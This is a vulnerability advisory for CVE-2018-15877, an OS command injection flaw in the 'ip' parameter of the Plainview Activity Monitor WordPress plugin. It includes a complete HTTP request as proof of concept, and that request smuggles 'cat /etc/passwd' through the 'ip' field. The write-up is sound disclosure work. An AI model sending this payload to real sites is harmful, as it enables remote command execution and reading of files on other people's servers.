# RCE with [```Plainview Activity Monitor```](https://fr.wordpress.org/plugins/plainview-activity-monitor/) WordPress plugin  
- Affected: ```Plainview Activity Monitor``` WordPress plugin.
- Version: `4.7.11` and possibly prior
- Privileges required: yes (but found CSRF & XSS can be combined - see [poc.html](https://github.com/aas-n/CVE/blob/master/plainview-activity-monitor/poc.html))
- CVE-ID: ```CVE-2018-15877```
- Author:
  - [Lyd√©ric Lefebvre](https://www.linkedin.com/in/lydericlefebvre/)

## Index

| Title        | Description   |
| ------------- |:-------------|
| [Description](#description)  | Description |
| [PoC](#poc) | PoC |

## Description

Plainview Activity Monitor is vulnerable to OS commanding which allows an attacker to remotely execute commands on underlying system. ```ip``` parameter in ```page=plainview_activity_monitor&tab=activity_tools``` is vulnerable.

![oscommanding](https://image.noelshack.com/fichiers/2018/34/6/1535228244-oscommand.png)

## PoC
```
POST /wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools
Content-Type: multipart/form-data; boundary=---------------------------13707449992054116824594351796
Content-Length: 311
Cookie: wordpress_70490311fe7c84acda8886406a6d884b=aas%7C1535400075%7CNJ8xAHSGtDKoNgc8tTpSZA6Dn6INW6PkzdG1IVzHX9Z%7C422290d1e6d712e3db5efb9ab4a9aa3df0631e20d5e0dce34ec84ec6f70766c8; PHPSESSID=18d2c15b8f5755104632ec1cc65c56e1; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_70490311fe7c84acda8886406a6d884b=aas%7C1535400075%7CNJ8xAHSGtDKoNgc8tTpSZA6Dn6INW6PkzdG1IVzHX9Z%7C0d8cef0facff651e3b0b7790b6c3f84dad36051b8378487acbe5bf03ebef52af; wp-settings-1=deleted; wp-settings-time-1=1535227275
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------13707449992054116824594351796
Content-Disposition: form-data; name="ip"

google.fr|cat /etc/passwd
-----------------------------13707449992054116824594351796
Content-Disposition: form-data; name="lookup"

Lookup
-----------------------------13707449992054116824594351796--
```
